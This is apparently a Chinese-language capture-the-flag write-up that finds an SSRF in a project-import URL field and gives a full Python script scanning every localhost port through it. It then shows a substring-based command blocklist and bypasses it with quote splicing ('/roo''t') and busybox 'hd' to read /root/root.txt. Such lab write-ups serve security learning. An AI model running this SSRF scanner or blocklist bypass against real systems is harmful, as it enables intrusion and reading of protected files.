SSRF

访问 80 端口。

并注册一个账户，spike@qq.com:12345678。

在 /dashboard，存在新建项目的功能点，指定 NAME/URL/BRANCH 后即可创建项目。

此处已存在一个项目 hello-devot。

点击该项目，会跳转到 /projects/1。存在 Import README 和 Run preview build 两个功能点。

可见 Import README 会接收我们输入的 URL 并进行处理，这样的功能点很可能存在 SSRF。

我喜欢通过输入 http://www.baidu.com 验证是否可以发起 HTTP 请求，结果确实回显了对应的 html 源码，说明确实存在 SSRF。

SSRF 的一大作用是探测内网服务，输入 http://127.0.0.1 发现确实可以探测内网，此处没有任何过滤。

抓包分析整个请求。

import requests
import re
import threading
import queue

BASE = "http://192.168.1.7"
INIT_SESSION = "eyJ1aWQiOjF9.avr0oQ.cfFyv_q1nqFAC_LuLLsix_x6TSo"
CLOSED_PAT = re.compile(r"Import failed: &lt;urlopen error \[Errno 111\] Connection refused&gt;")
FLASH_PAT = re.compile(r'class="flash message">(.*?)</div>', re.S)

def probe(target_url):
    # 第一步 POST import，初始干净cookie
    headers1 = {"Cookie": f"session={INIT_SESSION}"}
    data = {"url": target_url}
    r1 = requests.post(f"{BASE}/projects/1/import", data=data, headers=headers1, allow_redirects=False, timeout=8)
    # 取出POST返回的带flash的session
    sess_with_flash = re.search(r"session=([^;]+)", r1.headers.get("Set-Cookie","")).group(1)

    # 第二步 GET 页面渲染flash，这一步之后session自动重置回uid版本
    headers2 = {"Cookie": f"session={sess_with_flash}"}
    r2 = requests.get(f"{BASE}/projects/1", headers=headers2, timeout=8)

    flash_match = FLASH_PAT.search(r2.text)
    if not flash_match:
        return "NO_FLASH"
    flash_msg = flash_match.group(1)
    return flash_msg

def worker(q, out):
    while True:
        try:
            url = q.get_nowait()
        except queue.Empty:
            return
        msg = probe(url)
        if not CLOSED_PAT.search(msg):
            print(f"{url}  => {msg}", flush=True)
            out.append((url, msg))

def scan(port_range, threads=10):
    q = queue.Queue()
    for p in port_range:
        q.put(f"http://127.0.0.1:{p}/")
    res = []
    ths = [threading.Thread(target=worker, args=(q,res)) for _ in range(threads)]
    for t in ths: t.start()
    for t in ths: t.join()
    print("\nScan finished")

if __name__ == "__main__":
    scan(range(1,65536))

def check_step(step):
    if not isinstance(step, str):
        return False, "step must be a string"
    text = step.lower()
    for token in FORBIDDEN:
        if token in text:
            return False, token
    return True, None

这么多黑名单，吓哭了。

检测逻辑是 if token in text:，也就是子串匹配。

但是没有禁用 ' 和 "，所以我们可以拼接绕过，比如 /root 通过 "/roo""t" 拼接而成。

读文件禁用了 hexdump，但是没有禁用 Busybox 的 hd 命令（相当于 hexdump -C）。

所以我们可以实现对 root.txt 的读取，只需将命令修改为：

1

hd '/roo''t/roo''t.txt'
